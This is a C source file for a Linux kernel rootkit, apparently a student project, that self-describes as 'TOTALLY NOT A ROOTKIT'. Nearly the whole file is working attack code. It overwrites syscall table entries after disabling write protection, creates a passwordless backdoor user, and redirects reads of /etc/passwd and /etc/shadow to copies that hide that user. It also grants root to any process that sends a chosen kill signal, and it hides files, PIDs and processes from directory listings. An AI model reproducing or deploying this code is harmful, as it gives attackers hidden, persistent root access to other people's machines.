#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/umh.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

#define CR0_WRITE_UNLOCK(x)                       \
    do                                            \
    {                                             \
        unsigned long __cr0;                      \
        preempt_disable();                        \
        __cr0 = read_cr0() & (~X86_CR0_WP);       \
        BUG_ON(unlikely((__cr0 & X86_CR0_WP)));   \
        write_cr0(__cr0);                         \
        x;                                        \
        __cr0 = read_cr0() | X86_CR0_WP;          \
        BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
        write_cr0(__cr0);                         \
        preempt_enable();                         \
    } while (0)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan, Kleiman, Gao, Song");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

// max number of targets
#define NUM_TARGETS 4
#define BUF_SIZE 128

#define HIDE_FILE "secret"	//You can also hide processes by PID using HIDE_FILE if you want 
#define HIDE_PID "9999"
#define HIDE_PROCESS "./not"
// You can create a dummy process that runs and does nothing with this command: 
// perl  -MPOSIX -e '$0="dummy"; pause' &

static unsigned long *sys_call_table; //points to kernel's syscall table

/**
 * So that we can return a pathname and its kernel page from 1 function.
 */
typedef struct PathData {
    char *path_name;
    char *tmp_loc;
} PathData;

typedef struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

//MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
static int syscall_names[NUM_TARGETS];             //array defining syscall name (macro index) for each target
static void *original_syscallPtrs[NUM_TARGETS];    //array to store ptrs to the original kernel syscall functions
static void *totallyReal_syscallPtrs[NUM_TARGETS]; //array to store ptrs to our fake syscall functions
static bool toInject[NUM_TARGETS] = {0};           //array to toggle which targets to intercept (default all 0 unless changed in loadMod)


/**
 * Create old (fake) passwd & shadow file
 * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
 */
void create_fake_files(void)
{
    char *envp[] = {"HOME=/", NULL};

    // NOTE: probably want to hide these files with the "ls" part of the rootkit
    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/secretpasswd", NULL};
    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/secretshadow", NULL};

    printk(KERN_INFO "attempting to duplicate/create fake files\n");

    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy passwd\n");
    }

    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy shadow\n");
    }
}

/**
 * Create the backdoor user, which would be hidden while module is loaded
 */
void create_backdoor_user(void)
{
    char *envp[] = {"HOME=/", NULL};

    // add "-p" followed by a hashed password to specify a password.
    // currently, anyone can login to the account without a password.
    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};

    printk(KERN_INFO "attempting to create hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to create backdoor user\n");
    }

    return;
}

/**
 * Removes the backdoor user
 */
void remove_backdoor_user(void)
{
    char *envp[] = {"HOME=/", NULL};
    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};

    printk(KERN_INFO "attempting to remove hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0)
    {
        printk(KERN_INFO "unable to remove backdoor user\n");
    }

    return;
}

struct file * file_open(const char * path, int flags, int rights) {
	int err = 0;
	struct file *filp = NULL;
		
	mm_segment_t oldfs;
       	
	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	
	return filp;
}

int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
	int result;
	
	mm_segment_t oldfs;
	
	oldfs = get_fs();
	set_fs(get_ds());
	result = vfs_read( f, data, size, &offset);
	set_fs(oldfs);
	
	return result;
}

char * get_cmdline_path(char * buf, char * pid) {
	int i = 0;
	for (i = 0; i < BUF_SIZE; i++)
		buf[i] = 0;
	strcat( buf, "/proc/" );
	strcat( buf, pid);
	strcat( buf, "/cmdline" );
	return buf;
}

asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
  if (strstr(pathname, "/etc/passwd") != NULL) {
    pr_info("openAt called (open) path:%s, fd:%d\n", pathname, dirfd);
    copy_to_user((void *)pathname, "/etc/secretpasswd", strlen("/etc/secretpasswd") + 1);
  } else if (strstr(pathname, "/etc/shadow") != NULL) {
    pr_info("/etc/shadow opened\n");
    copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
  }
    return ((typeof(sys_openat) *)(original_syscallPtrs[0]))(dirfd, pathname, flags, mode);
}

//privilege escalation code
int secretEscalationSig = 42;
module_param(secretEscalationSig, int, 0);
MODULE_PARM_DESC(secretEscalationSig, "define a kill signal which when used will elevate the uid of the caller to 0 (root)\n");

void escalateProcess(pid_t pid)
{
    pr_info("escalation called for pid %d\n", pid);

    struct task_struct *currentTask = get_current();
    pr_info("current task struct has pid %d\n", currentTask->pid);

    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    struct cred *elevatedCred = prepare_creds();
    if (elevatedCred == NULL)
    {
        pr_info("ERROR: prepare_creds() returned NULL\n");
        return; // -ENOMEM;
    }
    elevatedCred->uid = kuid;
    elevatedCred->gid = kgid;
    elevatedCred->euid = kuid;
    elevatedCred->egid = kgid;

    pr_info("committing result %d\n", commit_creds(elevatedCred));

    return;
}

asmlinkage int totallyReal_kill(pid_t pid, int sig)
{
    pr_info("kill issued on pid %d with sig %d\n", pid, sig);
    if (sig == secretEscalationSig)
    {
        pr_info("secretEscalationSig used");
        escalateProcess(pid);
        return 0;
    }
    return ((typeof(sys_kill) *)(original_syscallPtrs[1]))(pid, sig);
}
//end privilege escalation code

asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
	// the output of getdents is the number of bytes read
	int nread;
	struct linux_dirent *mod_dirp;

	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[2]) )(fd, dirp, count);
	if (nread == -1) {
		pr_info("FAKEGETDENTS: error calling original function \n");
		return -1;
	}
	else {
		pr_info("FAKEGETDENTS: successfully read getdents");
	}

	mod_dirp = kvmalloc(nread, GFP_KERNEL);
	if (mod_dirp == NULL) {
		pr_info("FAKEGETDENTS: Error");
		kvfree( mod_dirp );
		return -1;
	}
	
	copy_from_user( mod_dirp, dirp, nread);
	
	int i, is_proc_name_match, offset = 0;
	unsigned short p_dirent_len;
	char buf[BUF_SIZE], filename[128];
	struct file *f;
	struct linux_dirent *p_dirp, *prev;
	while( offset < nread) {
		p_dirp = (void *) mod_dirp + offset;
		p_dirent_len = p_dirp->d_reclen;
		
		for (i = 0; i < 128; i++)
			buf[i] = 0;

		get_cmdline_path( filename, p_dirp->d_name);
		pr_info("FAKEGETDENTS: filename is: %s", filename);
		f = file_open( filename, O_RDONLY, 0 );
		if (f != NULL) {
			pr_info("FAKEGETDENTS: File open success");
			filp_close(f, NULL);
			file_read(f, 0, buf, BUF_SIZE - 1);
			pr_info("FAKEGETDENTS: cmdline is %s", buf);
		}

		is_proc_name_match = 0;
		if ( strstr( buf, HIDE_PROCESS ) != NULL )
			is_proc_name_match = 1;

		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
					|| is_proc_name_match
					|| strstr(p_dirp->d_name, HIDE_PID) != NULL ) {
			if (p_dirp == mod_dirp) {
				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
				nread -= p_dirent_len;
				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
				continue;
			}
			prev->d_reclen += p_dirent_len;
		}
		else {
			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
			prev = p_dirp;
		}
		offset += p_dirent_len;
	}
	
	copy_to_user(dirp, mod_dirp, nread);
	
	kvfree(mod_dirp);
	return nread;
}

/*** Equivalent to getdents bot for getdents64 ***/
asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
	// the output of getdents is the number of bytes read
	int nread;
	struct linux_dirent64 *mod_dirp;

	nread = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dirp, count);
	if (nread == -1) {
		pr_info("FAKEGETDENTS: error calling original function \n");
		return -1;
	}
	else {
		pr_info("FAKEGETDENTS: successfully read getdents");
	}

	mod_dirp = kvmalloc(nread, GFP_KERNEL);
	if (mod_dirp == NULL) {
		pr_info("FAKEGETDENTS: Error");
		kvfree( mod_dirp );
		return -1;
	}
	
	copy_from_user( mod_dirp, dirp, nread);
	
	int i, is_proc_name_match, offset = 0;
	unsigned short p_dirent_len;
	char buf[BUF_SIZE], filename[128];
	struct file *f;
	struct linux_dirent64 *p_dirp, *prev;
	while( offset < nread) {
		p_dirp = (void *) mod_dirp + offset;
		p_dirent_len = p_dirp->d_reclen;
		
		for (i = 0; i < 128; i++)
			buf[i] = 0;

		get_cmdline_path( filename, p_dirp->d_name);
		pr_info("FAKEGETDENTS: filename is: %s", filename);
		f = file_open( filename, O_RDONLY, 0 );
		if (f != NULL) {
			pr_info("FAKEGETDENTS: File open success");
			filp_close(f, NULL);
			file_read(f, 0, buf, BUF_SIZE - 1);
			pr_info("FAKEGETDENTS: cmdline is %s", buf);
		}

		is_proc_name_match = 0;
		if ( strstr( buf, HIDE_PROCESS ) != NULL )
			is_proc_name_match = 1;

		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
					|| is_proc_name_match
					|| strstr(p_dirp->d_name, HIDE_PID) != NULL ) {
			if (p_dirp == mod_dirp) {
				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
				nread -= p_dirent_len;
				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
				continue;
			}
			prev->d_reclen += p_dirent_len;
		}
		else {
			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
			prev = p_dirp;
		}
		offset += p_dirent_len;
	}

	copy_to_user(dirp, mod_dirp, nread);
	
	kvfree(mod_dirp);
	return nread;
}

void injectSyscalls(void)
{
    int targetIndex;
    for (targetIndex = 0; targetIndex < NUM_TARGETS; targetIndex++)
    {
        if (toInject[targetIndex])
        {
            pr_info("Starting injection for target %d\n", targetIndex);

            //save original ptr
            original_syscallPtrs[targetIndex] = (void *)sys_call_table[syscall_names[targetIndex]];
            pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);

            //inject fake ptr
            CR0_WRITE_UNLOCK({
                sys_call_table[syscall_names[targetIndex]] = (unsigned long)totallyReal_syscallPtrs[targetIndex];
            });
            pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);

            pr_info("Injection complete for target %d\n", targetIndex);
        }
        else
        {
            pr_info("skipping injection for target %d\n", targetIndex);
        }
    }
}

void restoreSyscalls(void)
{
    int targetIndex;
    for (targetIndex = 0; targetIndex < NUM_TARGETS; targetIndex++)
    {
        if (toInject[targetIndex])
        {
            pr_info("Restoring ptr for target %d\n", targetIndex);
            CR0_WRITE_UNLOCK({
                sys_call_table[syscall_names[targetIndex]] = (unsigned long)original_syscallPtrs[targetIndex];
            });
            pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
        }
        else
        {
            pr_info("Skipping restoration for target %d\n", targetIndex);
        }
    }
}

int __init loadMod(void)
{
    // create the fake file and backdoor files
    create_fake_files();
    create_backdoor_user();
    
    //get and store sys_call_table ptr
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (sys_call_table == NULL)
    {
        pr_info("sys_call_table not found using kallsyms\n");
        return -1;
    }

    pr_info("module loaded\n");
    pr_info("sys_call_table pointer is %p\n", sys_call_table);

    // FOR EACH NEW SYS CALL you must...
    // increment numTargets, thus obtaining a free index. Then using said index:
    syscall_names[0] = __NR_openat;                           	//store the syscall name (is macro for index in sys_call_table)
    totallyReal_syscallPtrs[0] = (void *)&totallyReal_openat;	//store the ptr to your fake function
    toInject[0] = 1;                                        	//set whether or not you want to inject your fake function.

    syscall_names[1] = __NR_kill;
    totallyReal_syscallPtrs[1] = (void *)&totallyReal_kill;
    toInject[1] = 1;

    syscall_names[2] = __NR_getdents;
    totallyReal_syscallPtrs[2] = (void *)&totallyReal_getdents;
    toInject[2] = 1;
	
    syscall_names[3] = __NR_getdents64;
    totallyReal_syscallPtrs[3] = (void *)&totallyReal_getdents64;
    toInject[3] = 1;

    injectSyscalls();

    return 0;
}

void __exit unloadMod(void)
{
    pr_info("notarootkit unloading\n");
	
    restoreSyscalls();
    remove_backdoor_user();

    pr_info("notarootkit unloaded\n");
    return;
}

module_init(loadMod);
module_exit(unloadMod);
